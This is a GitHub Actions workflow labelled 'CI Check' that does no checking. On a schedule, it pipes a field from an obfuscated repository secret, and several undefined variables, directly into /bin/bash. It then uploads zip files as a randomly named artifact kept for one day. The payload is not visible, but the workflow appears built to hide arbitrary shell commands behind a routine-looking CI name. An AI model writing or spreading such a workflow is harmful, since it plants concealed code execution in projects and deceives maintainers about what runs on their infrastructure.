name: CI Check
on:
  workflow_dispatch:

  schedule:
    - cron: '6 3,9,15,21 * * *'
permissions:
  contents: read
  actions: read
env:
  RUNNER_DEBUG: 0
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  task:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply
        env:
          qdae7: ${{ secrets.qdae7 }}
        run: |
          printf '%s' "$qdae7" | jq -r .s3 | /bin/bash
          echo $zi8 | jq -r .wkins2 | /bin/bash
          printf '%s' "$oo25" | jq -r .rhbi6 | /bin/bash
          printf '%s' "$eoi005" | jq -r .gpof30 | /bin/bash
          printf '%s' "$mia93" | jq -r .xi64 | /bin/bash
          printf '%s' "$vv96" | jq -r .pbp28169 | /bin/bash
          printf '%s' "$mlexe2" | jq -r .zr8 | /bin/bash
          printf '%s' "$gzwje6666" | jq -r .prhv74 | /bin/bash
          printf '%s' "$cklh6327" | jq -r .v21363 | /bin/bash

      - name: Upload output
        uses: actions/upload-artifact@v4
        with:
          name: BGpsCQIF
          path: "*.zip"
          retention-days: 1
